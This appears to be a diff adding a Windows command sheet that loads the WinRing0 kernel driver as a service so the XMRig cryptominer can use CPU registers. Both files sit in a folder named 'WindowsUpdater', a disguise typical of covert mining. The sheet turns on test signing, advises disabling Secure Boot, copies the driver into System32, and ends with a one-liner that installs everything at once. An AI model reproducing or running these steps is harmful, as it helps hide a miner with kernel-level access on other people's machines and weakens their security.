@@ -1,0 +1,198 @@
+
+# METHOD 1: CMD COMMANDS (Recommended)
+
+
+# 1. Navigate to driver location
+cd C:\ProgramData\WindowsUpdater
+
+# 2. Unblock the driver file
+powershell -Command "Unblock-File -Path '.\winring0x64.sys'"
+
+# 3. Stop and remove any existing driver
+sc stop WinRing0_1_2_0
+sc delete WinRing0_1_2_0
+
+# 4. Wait for cleanup
+timeout /t 3
+
+# 5. Create the driver service (Method A - Simple Path)
+sc create WinRing0_1_2_0 binPath= "C:\ProgramData\WindowsUpdater\winring0x64.sys" type= kernel start= demand
+
+# 6. Start the driver
+sc start WinRing0_1_2_0
+
+# 7. Check driver status
+sc query WinRing0_1_2_0
+
+# 8. Test MSR access (if you have XMRig)
+C:\ProgramData\WindowsUpdater\xmrig.exe --msr-test
+
+# ===============================
+# METHOD 2: CMD WITH NT PATH (If Method 1 Fails)
+# ===============================
+
+# Steps 1-4 same as above
+
+# 5. Create with NT-style path
+sc create WinRing0_1_2_0 binPath= "\??\C:\ProgramData\WindowsUpdater\winring0x64.sys" type= kernel start= demand
+
+# 6-8 same as above
+
+# ===============================
+# METHOD 3: POWERSHELL COMMANDS
+# ===============================
+
+# 1. Set driver path
+$driverPath = "C:\ProgramData\WindowsUpdater\winring0x64.sys"
+
+# 2. Unblock driver file
+Unblock-File -Path $driverPath
+
+# 3. Remove existing service if present
+try { Remove-Service -Name "WinRing0_1_2_0" -Force } catch { }
+
+# 4. Wait for cleanup
+Start-Sleep -Seconds 3
+
+# 5. Create new service
+New-Service -Name "WinRing0_1_2_0" -BinaryPathName $driverPath -StartupType Manual
+
+# 6. Start the service
+Start-Service -Name "WinRing0_1_2_0"
+
+# 7. Check service status
+Get-Service -Name "WinRing0_1_2_0"
+
+# 8. Test MSR access
+& "C:\ProgramData\WindowsUpdater\xmrig.exe" --msr-test
+
+# ===============================
+# METHOD 4: SYSTEM32 DRIVERS FOLDER
+# ===============================
+
+# 1. Copy driver to system drivers folder
+copy "C:\ProgramData\WindowsUpdater\winring0x64.sys" "%SystemRoot%\System32\drivers\winring0x64.sys"
+
+# 2. Unblock in system location
+powershell -Command "Unblock-File -Path '%SystemRoot%\System32\drivers\winring0x64.sys'"
+
+# 3. Clean existing
+sc stop WinRing0_1_2_0
+sc delete WinRing0_1_2_0
+timeout /t 3
+
+# 4. Create service with system path
+sc create WinRing0_1_2_0 binPath= "System32\drivers\winring0x64.sys" type= kernel start= demand
+
+# 5. Start service
+sc start WinRing0_1_2_0
+
+# ===============================
+# TROUBLESHOOTING COMMANDS
+# ===============================
+
+# Check if Secure Boot is enabled
+powershell -Command "Confirm-SecureBootUEFI"
+
+# Check service status detailed
+sc qc WinRing0_1_2_0
+
+# View service start failure reason
+sc query WinRing0_1_2_0
+
+# Check if driver file exists
+dir "C:\ProgramData\WindowsUpdater\winring0x64.sys"
+
+# Check file properties
+powershell -Command "Get-ItemProperty -Path 'C:\ProgramData\WindowsUpdater\winring0x64.sys'"
+
+# Check if file is blocked
+powershell -Command "Get-Item -Path 'C:\ProgramData\WindowsUpdater\winring0x64.sys' -Stream Zone.Identifier"
+
+# Enable test signing (if needed)
+bcdedit /set testsigning on
+
+# Check current test signing status
+bcdedit /enum | findstr testsigning
+
+# ===============================
+# VERIFICATION COMMANDS
+# ===============================
+
+# Method 1: Check service is running
+sc query WinRing0_1_2_0 | findstr "RUNNING"
+
+# Method 2: PowerShell service check
+powershell -Command "Get-Service WinRing0_1_2_0 | Where-Object {$_.Status -eq 'Running'}"
+
+# Method 3: Test MSR with XMRig
+"C:\ProgramData\WindowsUpdater\xmrig.exe" --msr-test
+
+# Method 4: Check for MSR registers (advanced)
+powershell -Command "Get-WmiObject -Class Win32_Processor | Select-Object Name, MaxClockSpeed"
+
+# ===============================
+# CLEANUP COMMANDS (If Needed)
+# ===============================
+
+# Stop and remove MSR driver
+sc stop WinRing0_1_2_0
+sc delete WinRing0_1_2_0
+
+# Remove from system32 drivers (if copied there)
+del "%SystemRoot%\System32\drivers\winring0x64.sys"
+
+# Disable test signing
+bcdedit /set testsigning off
+
+# ===============================
+# ALTERNATIVE: DEVCON COMMANDS
+# ===============================
+# (If you have Windows Driver Kit installed)
+
+# Install driver with devcon
+devcon install winring0x64.inf winring0
+
+# Remove driver with devcon
+devcon remove winring0
+
+# ===============================
+# ONE-LINER COMPLETE INSTALLATION
+# ===============================
+
+# Single command chain (run as Administrator)
+cd C:\ProgramData\WindowsUpdater && powershell -Command "Unblock-File -Path '.\winring0x64.sys'" && sc stop WinRing0_1_2_0 && sc delete WinRing0_1_2_0 && timeout /t 3 && sc create WinRing0_1_2_0 binPath= "C:\ProgramData\WindowsUpdater\winring0x64.sys" type= kernel start= demand && sc start WinRing0_1_2_0 && sc query WinRing0_1_2_0
+
+# ===============================
+# EXPECTED SUCCESS OUTPUT
+# ===============================
+# When MSR driver works correctly, you should see:
+
+# sc query WinRing0_1_2_0 output:
+# SERVICE_NAME: WinRing0_1_2_0
+#         TYPE               : 1  KERNEL_DRIVER
+#         STATE              : 4  RUNNING
+#         WIN32_EXIT_CODE    : 0  (0x0)
+
+# XMRig --msr-test output:
+# [2024-XX-XX XX:XX:XX.XXX] msr      register values for "intel" 0x1a4=0xf
+# [2024-XX-XX XX:XX:XX.XXX] msr      READY
+
+# ===============================
+# COMMON ERROR CODES & SOLUTIONS
+# ===============================
+
+# Error 1275 (Driver blocked by policy)
+# Solution: Disable Secure Boot in BIOS
+
+# Error 2 (File not found)
+# Solution: Check driver file path and existence
+
+# Error 5 (Access denied)
+# Solution: Run as Administrator
+
+# Error 1056 (Service already running)
+# Solution: Stop existing service first
+
+# Error 1070 (Service marked for deletion)
+# Solution: Reboot system or wait for cleanup
